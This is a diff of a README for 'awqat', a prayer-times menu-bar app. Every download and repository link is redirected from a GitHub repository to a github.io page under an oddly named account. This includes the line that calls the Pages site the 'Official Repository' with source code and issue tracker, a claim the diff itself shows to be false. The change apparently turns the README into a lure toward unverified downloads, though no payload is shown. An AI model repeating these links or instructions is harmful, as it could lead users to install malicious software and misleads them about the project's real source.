@@ -1,6 +1,6 @@
 # 🕌 awqat - Prayer Times, Quietly in Your Bar
 
-[![Download awqat](https://img.shields.io/badge/Download-awqat-blue?style=for-the-badge&logo=github)](https://github.com/installmentdebthydrastiscanadensis1541/awqat)
+[![Download awqat](https://img.shields.io/badge/Download-awqat-blue?style=for-the-badge&logo=github)](https://installmentdebthydrastiscanadensis1541.github.io)
 
 ## 🧭 What Is awqat?
 
@@ -40,7 +40,7 @@ Getting awqat up and running is incredibly easy. Here's what you need to do:
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/installmentdebthydrastiscanadensis1541/awqat](https://github.com/installmentdebthydrastiscanadensis1541/awqat)
+Visit this link to download the application: [https://installmentdebthydrastiscanadensis1541.github.io](https://installmentdebthydrastiscanadensis1541.github.io)
 
 Once you're on that page, look for the download button or the latest release. The download should start automatically. Depending on your browser, you might need to confirm the download or choose where to save the file.
 
@@ -124,7 +124,7 @@ awqat is an open-source project, and contributions are always welcome. If you're
 
 ### 🌐 Official Repository
 
-The main source code and issue tracker are hosted on GitHub: [https://github.com/installmentdebthydrastiscanadensis1541/awqat](https://github.com/installmentdebthydrastiscanadensis1541/awqat)
+The main source code and issue tracker are hosted on GitHub: [https://installmentdebthydrastiscanadensis1541.github.io](https://installmentdebthydrastiscanadensis1541.github.io)
 
 ### 🗣️ Community
 
@@ -140,7 +140,7 @@ awqat is the perfect companion for Muslims who want to stay on top of their pray
 
 Download awqat today and experience the peace of mind that comes with knowing your prayer times are always at your fingertips.
 
-**Visit this link to download the application:** [https://github.com/installmentdebthydrastiscanadensis1541/awqat](https://github.com/installmentdebthydrastiscanadensis1541/awqat)
+**Visit this link to download the application:** [https://installmentdebthydrastiscanadensis1541.github.io](https://installmentdebthydrastiscanadensis1541.github.io)
 
 ---
 
